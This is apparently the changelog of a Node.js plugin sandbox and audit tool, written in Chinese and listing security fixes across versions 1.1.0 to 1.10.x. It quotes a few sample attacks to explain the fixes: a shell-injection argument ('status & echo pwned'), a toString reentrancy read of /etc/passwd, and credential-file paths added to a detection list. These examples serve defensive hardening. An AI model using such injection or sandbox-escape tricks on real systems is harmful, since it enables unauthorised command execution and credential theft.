  的 blockedSoFar 看不到安全门禁阻断项。现在错误保留在 `stage.errors` 与
  `report.errors`；strict 模式下据此跳过 loadability。`report.ok/blocked` 语义不变
  （safety 按设计「只打标签不阻断」，硬阻断只统计非 safety 门禁）。
- **M15 realpathSafe fail-closed**：非 ENOENT 失败（EACCES/ELOOP/ENAMETOOLONG…）
  一律返回 `null`，不再退回词法路径（fail-open 等于给符号链接后门留 ELOOP 掩护）。
  调用方 fail-closed：derive 折算 `derive_failed` 拒绝、结构门禁记
  `entry_realpath_failed`、`expandPath` 配置期直接抛、`resolvePath` 抛。
  ENOENT（纯不存在）场景保留词法退化（写/新建文件合法）。
- 回归：`test/review6-fixes.test.js` 8 例（含平台条件断言：长路径/符号链接环在
  本机产生非 ENOENT 时才断言 fail-closed）。全量 234 例 / 230 通过 / 0 fail /
  4 symlink skip。宿主冒烟 13 项脚本收进 `dsh-dashcam-host/test/smoke-host.mjs`
  （`npm run smoke`），宿主包自此建 git 仓库（首次入库）。

## 1.10.8 修复（实跑测试暴露出的两条宿主-本体口径差）

来自 `handoff/dsh-dashcam-test-1.10.7-2026-11-06.md` 的实跑问题：

- **宿主 `config.requests` 写成字符串会静默失效（问题 1，中）**：`requests: [fs.read]`
  这种错语法不是报配置错误，而是等到运行时判成 `未声明的能力或范围：fs.read (...)`，
  把「配置语法问题」伪装成「能力未声明」。根因：`dashcam.activate()` 直接吃 manifest，
  不走 `parseManifest` 里的 `normalizeRequest`——宿主 mount 前自己不校验。修复：
  `dsh-dashcam-host` mount 时用 `dashcam.normalizeRequest` + `normalizeGrant`
  提前校验，非法直接打印完整报错（含正确 YAML 示例）并 return，fail-fast。
- **advisory 下 deny 被账本记 `intercepted=true`（问题 2，中低）**：advisory 模式
  宿主会自行放行 `guard.check()` 返回的 deny 结果，但 guard 无从知道，于是账本里
  出现大量 `decision=deny / intercepted=true / 实际放行` 的矛盾记录。`Ledger.interceptions()`
  会把这些也算进「真正被拦截的次数」，抬高 metrics/画像。修复：`guard.check` 新增
  `options.advisory: boolean`——传入后 deny 账本 `decision` 仍记 deny（审计事实保留），
  但 `intercepted` 一律写 false；宿主 advisory 模式调用时显式传 `{ advisory: true }`。
  allow 路径补 `intercepted: false`（原账本有但 denial 对象没带，口径不一致）。
- 新增 `test/review5-fixes.test.js::R5-5` 覆盖 advisory 账本语义；全量 226 例
  （+1）/ 222 通过 / 0 fail / 4 symlink skip。宿主冒烟 10/10 PASS（fail-fast、
  advisory intercepted=false、enforce deny intercepted=true、interceptions() 过滤）。

## 1.10.7 修复（1.10.6 复核残余批）

1.10.6 复核报告（2026-11-06）确认已修项扎实、无回归，同时点名两条未关口子，本版逐条关闭：

- **spawn 系 `shell:true` 的 args 注入（复核残余 1，P1）**：`shell:true` 时整条命令行
  （首词 + 全部参数）都会被 shell 重新解释，此前只对 `args[0]` 扫元字符——
  `execFile('git', ['status & echo pwned > PWN'], { shell: true })` 判定层放行（复核实测）。
  现在把首词与全部字符串/数组参数拼成完整命令行后统一扫元字符（ruleId `shell_metachar`，
  先记账再拒绝）；参数干净时不误伤，照常落到既有首词判定。
  回归：`test/review5-fixes.test.js` R5-1 / R5-2。
- **函数型 options 一律拒绝（复核残余 2，P2）**：`cp` 的 `filter` 回调、
  `createReadStream` 的自定义 `fs` 实现对象按引用保留，会在原生重入窗口内执行插件代码，
  其内部的越权调用被直通放行且账本零痕迹（复核实测可越权写文件）。回调是能力走私的
  天然通道，而「把回调切回判定层」在原生同步调用下不可行——因此函数型 options
  （含实现对象第一层的函数属性）直接拒绝（ruleId `function_options`，拒绝先记账再抛），
  报错引导改用无回调写法；`AbortSignal` 等按引用保留的原生类型不受影响。
  回归：`test/review5-fixes.test.js` R5-3 / R5-4。
- `knownGaps` 同步收敛：原「options 里的回调与实现对象按引用保留」一条随上述修复移除，
  余下条目不变。全量 `npm test`：用例数 221 → 225（新增 4 例，0 fail，4 例符号链接
  EPERM skip 照旧）。

## 1.10.6 修复（安全审查快赢批）

2026-11-05 安全审查报告的 5 条 medium「快赢」项，逐条对应报告 M 编号：

- **M12 retired 密钥仍可验签**：`findKey` 此前只排除 `revoked`，`retireKey` 置为 `retired`
  的密钥照样通过发布者/审核者验签——「轮换完成」名存实亡。改为只接受
  `status === 'active'`：轮换窗口内新旧双钥并行（双 active）语义不变，retire 即失验。
  回归：`test/signatures.test.js` 轮换用例改写（retire 后旧包在 keyId 阶段拒验、新包不受
  影响）；`test/quick-wins.test.js` M12 直测 `findKey` 状态白名单。
- **M2 数字 path 判定对象 ≠ 执行对象**：`payload.path = 0` 时守卫按字符串 `"0"` 判定
  （`<root>/0` 可被 `$PLUGIN/**` 放行），OS 却 `readFileSync(0)` 读宿主 stdin。路径参数
  现在只接受 string/Buffer/URL，其余类型在判定层直接拒绝（ruleId `invalid_path_type`，
  不再 `String(value)` 兜底）；derive 主动抛出的精确 ruleId 透传到拒绝结果与账本，
  ChildHost 的 fs 入口在任何真实 IO 之前被拒。攻击 1.1 的 toString 重入与 review3 S0 的
  参数强转场景随之在类型门更早关死（相关用例已同步改写，断言新口径）。
- **M6 uninstall 回收链半途失败**：`redirect.uninstall()` 抛错会跳过 `bridge.uninstall()` /
  `seal.stop()` / `active` 清理，旧 Hook 继续判下一个插件。回收链改为逐段 try/finally 且
  `active` 先清零：任何一步失败都不允许跳过其余清理，首个错误照常抛给调用方（回收失败
  必须可见）。回归：注入 redirect 抛错，断言 bridge 仍被卸载、seal 仍停止、宿主可重新注册。
- **M13 凭证黑名单缺项**：`~/.git-credentials`（git 明文 PAT/密码）与
  `~/.config/gh/hosts.yml`（gh CLI 明文 token）不在凭证路径正则里，授予家目录读即可拿走
  GitHub 凭证而不触发 `cred.read`。已补入两条匹配（`~/.dsh` 拿不准，仅在 `paths.js`
  注释说明、不加）。回归：读这两类路径升级为 `cred.read` 判定并在账本留痕。
- **M14 npm test 脚本漏文件**：显式列表漏 `test/child-host.test.js`、`test/child.test.js`、
  `test/protocol.test.js`——多进程运行时与 IPC 协议整段没被跑。已补入并新增
  `test/quick-wins.test.js`；新增自检用例强制「脚本覆盖数 = 磁盘 `test/*.test.js` 文件数」
  （当前 33 = 33），防止再次漏项。
- 全量 `npm test`：用例数 215 → 221（217 通过 / 4 例符号链接 EPERM skip 照旧 / 0 fail），
  其中快赢批新增 6 例、改写既有用例 3 例（signatures 轮换 / 攻击 1.1 / review3 S0）。

## 1.10.5 修复（三视角审查 v2）

- **H1 重入窗口逃逸（已实证的 high）**：类实例与带自有可枚举 `__proto__` 属性的普通对象，能让插件 getter
  在原生重入窗口（`callDepth > 0`）内执行，getter 里的越权 IO 被直通放行且账本零记录。fs 系方法对 options
  参数改做**白名单提取**（`FS_OPTIONS` 表：每个方法只保留原生实际读取的键），提取的 [[Get]] 发生在
  `callDepth === 0`——类实例/原型链上的 getter 在窗口外触发，其副作用照常撞守卫链并记账；回填用
  `defineProperty` 写入 null 原型副本（不触发 `__proto__` setter，堵死 `Object.assign` 换原型机制）。
  其余入口由 `stripArgTraps` 逐自有可枚举键浅拷兜底；Buffer/TypedArray/URL/AbortSignal 仍按引用保留。
  回归：`attack-surface.test.js` 攻击 1.5（类实例）/ 1.6（自有 `__proto__` + 原型链组合）。
- **H2 装载 observe 窗口 fail-open**：新增 `policy.enforcement.observeLoadWindow`（默认 `true`，
  存量 legacy 插件不至于装载即死）；置 `false` 后装载期越界直接拒绝装载（fail-closed）；`strictPatch = true`
  时强制关窗。装载结束若 `stats.observed > 0` 打 warning——放行让步必须可见。「安全边界（必读）」已把
  装载窗口从优点改述为残余风险（1.4.0 小节保留历史记述）。
- **H3 exec/execSync shell 元字符**：走 shell 的命令含 `;|&$\`>'` 换行等元字符时直接拒绝（ruleId
  `shell_metachar`，先按 deny 记账再抛错），首词判定不再覆盖 shell 的重新解释；`spawn` 系的 `shell: true`
  同判，自定义 `shell` 字符串与 fork 的非当前 Node `execPath` 一律拒绝。命令请改用 `execFile` 逐参数传递。
- **H4 `fs.promises.cp` 漏补丁**：fsp 段补齐 `cp`（读写双面判定，口径同 `fs.cp`）以及 `readlink` / `statfs`
  等漏项；新增「fs 与 fsp 方法覆盖对照」测试——凡 fs 已 patch 且 fsp 存在同名 API 的方法必须同样受控，
  防再次漏项。
- **H5 activate 半途失败 / dispose 泄漏 Hook**：`createPluginRuntime` 的安装步骤失败时逆序卸载已装项再抛错，
  不再叠加 Hook 层；`dispose()` 与 `deactivate()` 收敛到同一幂等 release 路径（引用计数归零才真正拆
  Hook）——直接 `dispose()` 之后可再次 `activate()`，重复释放为空操作。
- **H6 账本半行恢复 + 多实例误报**：`_recover` 把崩溃残留的半行截到最后一个换行并 fsync 落盘，哈希链从
  最后一条完整行无损续写；append 部分写入失败时截回写入起点，不再把残骸和新行焊成坏 JSON。同进程多实例
  按账本路径共享 seq/lastHash/size 基准，准入/注册/运行时交替写入不再误报「并发写入」；Ledger 之外的
  写入者（外部进程直写）仍被检测——append 持续报错，新实例构造时打 warning 告警。
- 回归测试新增 `test/review4-fixes.test.js`（H2-H6 共 10 例）与攻击 1.5 / 1.6 等，用例数见下。

## 1.10.4 恶意攻击面用例（12 例）

新增 `test/attack-surface.test.js`：不是"证明防住了什么"，而是按四类降维打击跑真实宿主生命周期
（`install → register → invoke → uninstall`），能防的钉死、防不住的写进 `knownGaps`。

- **重入与原型链**：`toString` 求值期间的嵌套写入被拒（账本记 `not_declared` / `intercepted`），
  `pwned.txt` 不落地；`Proxy` get 陷阱里的读取同样被拒；`Object.prototype` 上塞
  `paths` / `capabilities` 不放大能力面。
- **加载器逃逸**：`process.getBuiltinModule('fs')`、从非插件父模块 `require('fs')`、
  删 `require.cache` 后重新 `require` —— 拿到的都是**同一个已被补丁的模块对象**，
  读取仍被拒；handles 模式下不存在的 `readSync` 不会因清缓存复活。
- **异步上下文**：`Worker`（eval）与 `execSync` 在未声明 `proc.spawn` 时创建即被拒；
  `new Function('return process')()` 拿到的全局 `process` 不构成逃逸。
- **实测缺口（已写入 `knownGaps`）**：
  - 卸载后仍在事件队列里的定时器/回调——Bridge 已还原原生模块，写入**成功**；
  - 已授权的 `worker_threads` / 子进程内部——独立 realm/进程，本进程 Hook 不可见。
- 用例数 166 → 178，且在宿主自带 Node 24.21.0 上跑通。

## 1.10.3 修复（第三轮三视角审查）

- **S0 重入窗口越权**：`patchMethod` 以前把「判定 + 原生调用」整段包在 `callDepth` 里，
  于是参数上的 `toString` / `valueOf` 可以在判定期间回调 Bridge 做**不受管**的原生调用
  （`fs.existsSync({toString(){ fs.readFileSync(/etc/passwd) }})` 可读出内容且账本零记录）。
  现在重入窗口只包住原生调用，判定与参数解析始终在窗口外。
- **S2 句柄重复判定**：句柄必须在 Bridge **之前**创建。顺序颠倒时句柄钉住的是包装函数，
  同一次 `ctx.handles` 调用会被判两次（账本两条，`oneSeal` 第二次直接判成 exhausted）。
- **S2 `sandbox` 字符串写法**：`{ sandbox: 'handles' }` 以前被静默丢掉、实际跑 global；
  现在字符串映射为 `{mode}`，且 `mode` 走白名单校验，非法值直接报错。
- **S2 注册半装载**：`module.activate` 抛错时依次回滚 deactivate / 重定向 / Bridge / seal /
  `modules` / `active`，不会把宿主卡在「已有活动 Bridge，后续注册全部失败」。
- **S3 `fetch` 重定向 SSRF**：包装器强制 `redirect:'manual'`，每一跳按 `Location` 重新判定，
  跳数封顶 5、协议收紧到 http/https；拿不到可复放 body 时把 3xx 交回调用方，绝不自行跟随。
  Bridge 与 net 句柄共用 `runtime/redirects.js`。
- **S3 前端 XSS 汇聚点**：驾驶舱模板给所有插件可控字段接上 `esc()` 转义出口。
- **IPv6 host 断言**：`host:port` 切分先剥方括号，`[::1]:443` 与 `::1:443` 两种写法等价比较。
  （修复过程中发现新切分函数与校验函数同名导致 `normalizeHosts` 返回对象、端口比较失效——
  已改名 `splitHostPortPair` 并补用例锁死。）
- 用例数 159 → 166。

## 1.10.2 设计微调 + 一致性修复

- **`sandbox.mode` 默认 `global`**：封闭句柄面不完整（`openSync` / `fs.promises.open` / `watch` /
  `globSync` 都不在句柄里，`openSync` 因必须返回 fd 无法兼容），默认开 `handles` 会打断存量插件。
  现在两条路径（`LocalHost` 与 `activate()`）都默认 `global`，`handles` 是显式选项。
- **`minMacKeyBytes` 下限提到 32**：`policy.limits` 不再允许把 HMAC-SHA256 强度关掉；
  低层 `resolveLedgerMacKey(minBytes)` 仍可自定义。
- **P1 修复**：`createPluginRuntime` 现在以 `policy.sandbox.mode` 为唯一真相，并兼容
  `sandbox: 'handles'`（字符串）与 `sandbox: { mode: 'handles' }`（对象）两种写法。此前对象写法
  会因 truthy 被静默忽略、实际跑在 global。
- **P2 修正文档**：`node_modules` 依赖在 `pluginRoot` 之内，**会被**重定向（旧文档说不会）。
- **P3/P4**：更新过期的 `activate` 注释；默认用例不再显式传 `sandbox`。
- 用例数 158 → 159。

## 1.10.1 修复（第二轮三视角审查）

- **H-1 `fetchTimeoutMs` 真的生效了**：`createCapabilityHandles` 以前把 `limits` 收了却不往下传，
  宿主设 3 秒、实际 30 秒。现在一路传到 net 句柄，并有走 `LocalHost → ctx.handles.net` 的集成用例。
- **M-1 计数器提前占位**：`activate()` 以前先注册回调再 `+1`，回调抛错时 Hook 已装但计数为 0，
  下一次激活会叠加。现在失败会回滚计数并 `dispose()`。
- **M-3 limits 校验**：`batchTargets: 'abc'` 会让上限比较恒为 false（静默失效）；现在
  `resolveLimits`/`loadPolicy` 直接拒绝非整数/越界值。`fetchTimeoutMs: 0` 是合法值。
- **M-4 `coverage().installed`**：`strictPatch` 拒绝装载后不再留下"指向已卸载 Bridge"的假象。
- **L-1 账本写失败的归因**：部分写入后把基准对齐到真实大小，磁盘错误不再被报成"并发写入"；
  真正的并发检测保持原样（不会被重对齐吞掉）。
- 用例数 153 → 158。

## 1.10.0 新增（可配置上限）

写死的常量全部抽进 `policy.limits`，默认值不变：

| 键 | 默认 | 作用 |
| --- | --- | --- |
| `batchTargets` | 10000 | 单次 `enforceBatch` 目标上限 |
| `globBatchSize` | 256 | 异步 glob 分块大小 |
| `fetchTimeoutMs` | 30000 | 出网 `fetch` 默认超时（0 = 不注入） |
| `integrityEvery` | 64 | 每 N 次判定抽样完整性校验（0 = 关闭） |
| `minMacKeyBytes` | 32 | `macKey` 最小字节数 |

外加一个可选强约束 `policy.enforcement.strictPatch`：默认 `false`（补丁不完整只记账 +
`coverage().unpatched` 暴露），打开后升级为`拒绝装载`。这是"非侵入式"与"fail-closed"
之间唯一留给宿主的开关。

```js
new LocalHost({ policy: { limits: { fetchTimeoutMs: 5000 }, enforcement: { strictPatch: true } } });
```

- 用例数 146 → 153。

## 1.9.0 修复（三视角审查）

一次红队 / 架构 / 边界的三视角审查，确认 3 条必改、6 条建议，全部修完：

- **H1 补丁失败不再静默**：`patchMethod` 装不上时记入 `unpatched`，`coverage()` 给出
  `{unpatched, complete}`，并写一条 `ruleId='bridge_incomplete'` 账本。此前某个入口 patch 失败，
  它就是裸的，而 `installed` 仍是 true。
- **H2 完整性校验接线**：`createGuardChain({integrityEvery})`（默认 64）在判定循环里抽样
  `verifyIntegrity()`。此前这套机制**只被测试调用过**——声称的防篡改在生产路径上不存在。
- **H3 Windows 大小写**：模块重定向的父模块判定改为大小写不敏感（仅 win32）。
  此前 `pluginRoot` 大小写与实际不一致会让 `require('fs')` 静默拿回原生 fs。
- **M1 fetch 默认超时**：句柄的 `fetch` 在调用方未给 `signal` 时注入 30s 超时
  （Node 原生 fetch 没有默认 timeout）。
- **M2 glob cwd 不再静默忽略**：认不出的 `cwd` 类型现在直接拒绝，而不是退回
  `process.cwd()` 让判定对象和真实遍历对象错位。（Node 自身的 `fs.glob` 目前只接受 string cwd，
  URL 分支是防御性的。）
- **M3 未知协议给出明确拒绝**：以前会回落到 http 模块，抛的是 Node 的
  `ERR_INVALID_PROTOCOL`（错误信息误导）；现在直接说明「不支持该协议」。**实测并未真的发出
  跨协议请求**，所以这条从"协议混淆"降级为"错误契约"问题。
- **M4 单运行时**：`activate()` 拒绝第二个活动运行时（原生 Hook 会叠加、内层账本会漏记）。
- **M5 账本单写者检测**：并发追加会报错，而不是写出重复 `seq` 让账本自己验不过。
- **M6 失陷可见**：`coverage().compromised` 暴露完整性状态。
- **L1/L2**：批量判定加上限（10k 目标）、ESM 入口给出明确错误。
- 用例数 135 → 146。

## 1.8.0 新增（把「一条记录代表 N 个目标」这件事做完整）

- **glob 账本聚合**：`fs.glob` / `globSync` / `fs.promises.glob` 不再一个结果一条账本。
  100 个匹配 = **1 条** `two-key-batch` 记录（判定仍然逐个做）。异步迭代器按 256 条分块，**判完再交付**。
- **worker 的 eval 不再把源码写进账本**：`new Worker(code, {eval:true})` 的 command 现在是
  `worker:eval:<源码 sha256 前 12 位>`——可去重、可对账，但源码不落盘。
- **批量记录的审计口径修正**：混合能力的批次不再记成单一能力（否则 `cred.read` 会被藏进 `fs.read`），
  记 `capability:'mixed'` 且 `scope.capabilities` 列出全部；observe 窗口内的越界也不再被记成 allow。
- **MAC 密钥托管**：`resolveLedgerMacKey()` 支持「值 > 文件 > 环境变量」，短于 32 字节直接拒绝，
  显式指定却取不到一律失败关闭；`LocalHost.redact()` 给出不含密钥的摘要。
- **CLI `metrics` 先校验再统计**：账本校验不过（含 `mac_key_missing`）直接非零退出，
  并提示 `--mac-key-file` / `--mac-key-env`；支持 `--anchor <file>`。
- 度量口径：新增 `batchRecords` / `batchedTargets` / `effectiveRequests` / `targetInterceptionRate`
  等并列字段，旧字段语义不变（记录数 vs 目标数，两套读数并存）。
- 用例数 114 → 135（新增 glob / worker / mac-custody / 批量守卫 / 度量 / 不变量六组）。

## 1.7.0 修复（mac 完整性三处硬伤）

- **无密钥校验不再静默通过**：账本含 v3 行但 `verify()` 没拿到 `macKey` 时返回
  `mac_key_missing`。之前这种情况 `ok === true`，等于把「没验 mac」说成「验过了」。
- **禁止降版本**：v3 之后出现 v1/v2 行 → `version_downgrade`，堵住「追加一条无 mac 的低版本行」。
- **新增外部锚点**：`ledger.anchor()` / `verify({ anchor })`。哈希链发现不了尾部截断——
  砍掉最后几行，剩下的前缀依然自洽；锚点是唯一能发现它的东西。
- **`fs.promises.link` 补上读权限**：`fs.link` 上轮已修，promises 版本漏了，硬链接逃逸还在。
- **fd 复核改用原生 realpath**：异步 `open` 的回调里 `callDepth` 已归零，用被包装的
  `fs.realpathSync` 会重新进守卫链——多写一条账本，且「只写」的 open 会被自己判成越权。
- 用例数 108 → 114（新增 `test/ledger-mac.test.js` 五条 + 硬链接用例一条）。

## 1.6.0 新增（封闭世界补完 + 路径硬化）

- **net / proc 能力句柄**：`createCapabilityHandles` 现在返回 `{ fs, net, proc }`。
  `net` 只做出站（`fetch` / `request` / `get` / `connect` / `createConnection`），端口必填、Unix socket 直接拒绝；
  `proc` 给 `spawn/exec/fork/kill`，命令名口径复用 `bridge.firstCommand`，不另写一份解析。
- **符号链接逃逸已堵**：判定对象改成 **OS 真正会操作的真实路径**（`realpathSafe`），
  `$PLUGIN/**` 里的链接再也不能把判定带出范围。凭证升级同样按真实路径判——把 `id_rsa` 链成 `notes.txt` 不再能降级。
- **pluginRoot 先规范化成真实根**：否则 macOS 的 `/var → /private/var` 会让所有 `$PLUGIN` 授予失效。
- **硬链接补洞**：`link` / `linkSync` 现在同时要求 `args[0]` 的 `fs.read`——否则「把外部文件 link 进插件目录再当普通文件读」就能绕开。
- **`resolvePath` 与 derive 同口径**：导出给宿主的也是真实路径，避免宿主二次判断得出不同结论。
- **隔离档判定统一** `isQuarantined()`：`portrait` / `activate` / 门禁报告不再各写一套。
- 用例数 84 → 104（新增 `net-proc-handle` / `symlink` / `portrait-labels` 三组；其中 3 条因 Windows 无符号链接权限显式 skip）。

## 1.5.0 新增（能力注入）

- **`require('fs')` 可选返回能力句柄**：`sandbox.mode='handles'`（显式开启）时按 `pluginRoot` 范围重定向
  `fs` / `node:fs` / `fs/promises`；默认 `global`，用原生 fs + Bridge 守卫，存量插件零改动。
- **句柄补 `constants`**：只是一堆数字，不构成能力面，放行能显著降低改造量。
- **两条路径默认一致**：`activate()` 与 `LocalHost` 都默认 `global`，不会出现「门禁一套、运行时另一套」。
- **度量分开统计**：新增 `undeclaredInterceptions` / `undeclaredInterceptionRate` 与
  `grantDenials` / `grantDenialRate`——「插件越界」和「宿主没发钥匙」不该混在一个拦截率里。
- 用例数 77 → 84（新增 `test/sandbox.test.js` 七条）。

## 1.4.0 修复（装载窗口与账本兼容）

- **装载窗口不再真空**：Hook 提到 `require` 之前安装，窗口内走 observe——判定与记账照做，只是不阻断。
  窗口关闭后立即恢复 fail-closed。新增 `guard.beginObserve()` / `endObserve()` / `isObserving()` 与 `stats.observed`。
- **入口加载不再污染账本**：宿主先读源码，再在窗口内 `_compile`，加载器自身的读文件不会被记成插件行为。
- **`admitting` 改为私有字段**：之前它是公开属性，调用方写一行就能跳过全部门禁。
- **strict 模式不执行插件代码**：前置门禁阻断时跳过 `loadability`，输出 `loadability_skipped`。
- **Ledger v1 兼容**：`verify()` 按 `v` 选字段集，历史账本继续可验；v1 记录被塞入 `intercepted` 会被 hash 抓住。
- **`guard.coverage()` / `LocalHost.coverage()`**：宿主可以直接拿到当前受控入口清单。
- 用例数 69 → 77（新增 `test/observe.test.js` 六条与两条 v1 账本用例）。

## 1.3.0 新增（非侵入式防护）

- **manifest**：无 `dashcam` 不再报错，生成默认 `{ level: 'legacy', quarantine: true }`；新增 `isQuarantined()`。
- **守卫入口 Hook**：`guard.installNativeHooks()` / `uninstallNativeHooks()`；`createGuardChain({ nativeHooks: true })`
  可在入口直接安装，`LocalHost` 与 `activate` 都走这条路径。
- **门禁标签化**：`report.labels` / `securityLabels` / `labelLines`，阶段状态新增 `warn`；
  只有 `MALICIOUS_CODES` 与黑名单阻断，`ok = 无阻断`。
- **Ledger v2**：新增固定字段 `intercepted`，`Ledger.interceptions()` 输出“实际拦截的未声明 API 调用”。
- **默认策略**：`enforcement = { mode: 'advisory', allowLegacy: false, requireSignature: false }`；
  `required` / 企业通道仍保留拒装语义。
- 用例数 67 → 69（`audit` 新增 intercepted 与入口 Hook 用例）。

## 1.2.0 新增

- **能力句柄（实验）**：`createCapabilityHandles({ guard })` 给出封闭的 `fs` facade——未列出的方法不存在，
  不接受 fd 参数，`open()` 返回无 `fd` 的受限句柄，对象冻结。这是「换一个小世界」路线：
  新插件给句柄，Bridge 只作旧代码的兼容层。`handle.coverage()` 与 `bridge.coverage()` 可直接对照。
- `open` 的 flags 判定抽到 `capabilityNeedsForOpen`，Bridge 与句柄共用一套口径。
- 用例数 61 → 67（新增 `test/handle.test.js`）。

## 1.1.0 变更（破坏性，1.3.0 起默认值已翻转为 advisory）

- **默认不可装载**：`policy.enforcement.mode` 默认 `required`，`legacy` 插件在任何通道都装不上，`activate()` 直接拒绝。
  升级方式：显式设置 `policy.enforcement = { mode: 'advisory' }` 恢复旧行为（应记一条规则级回滚）。
  > 1.3.0 已把默认值改为 `advisory`，本节仅保留历史记录。
- **准入内建于宿主**：`LocalHost.install` 自己跑完整门禁流水线，没有跳过参数；准入结论写 Ledger（`ruleId=admission`）。
  构造 `LocalHost` 时需要传 `trust`，否则准入失败。
  > 1.3.0 起没有信任表只输出 `Untrusted` 标签，`install` 仍会成功；`required` 模式下才需要 `trust`。
- **`env.write` 敏感键升级为 `cred.write`**：覆写 `*_KEY` / `*_TOKEN` 一类变量必须单独授权。
- **审计归因修正**：`allow` 记录的 `reason` 来自真正覆盖本次请求的声明，不再是同能力的第一个声明。
- **One-Seal 两阶段**：`reserve → commit`，Ledger 写失败时 `release`，不再白烧一次性授权。
- **Bridge 补齐入口**：`open` / `openSync` / `opendir` / `realpath` / `truncate` / `chmod` / `chown` / `utimes` / `mkdtemp` /
  `symlink` / `link`、`net.Socket#connect`、`dns.promises`；新增 `bridge.coverage()` 自检。
  注意 `mkdtemp` 现在算 `fs.write`，宿主/测试需要在安装 Bridge 之前建好临时目录。
- **`Ledger.verify()`** 在尾行损坏时报告 `json_invalid` 并返回 `head=null`，不再抛异常。
- 用例数 44 → 61（新增 `test/audit.test.js`、`test/mandate.test.js`）。

## 版本对照（核心包 ↔ 宿主适配包）与早期作者身份说明

核心包与宿主适配包独立版本号——适配包跟随宿主侧的集成节奏：

| 核心（`dsh-dashcam`） | 宿主适配（`dsh-dashcam-host`） | 里程碑 |
| --- | --- | --- |
| 1.10.12 | 1.10.12 | 宿主适配包以 git subtree 方式并入本仓库 |
| 1.11.0 | 1.11.0 | 改名 dsh-covenant → dsh-dashcam |
| 1.12.0 | 1.14.0（当前） | 核心新增 ingress 审计；适配包接入 ingress 接线与 Agent Dashcam 面板 |

今后每次打 release tag，annotation 中注明对应的宿主适配包版本。

1.6.0–1.10.x 时代的提交使用占位身份（`dsh-covenant <dev@local>`），自改名起使用 GitHub noreply 地址。历史有意不改写。

## 许可

MIT
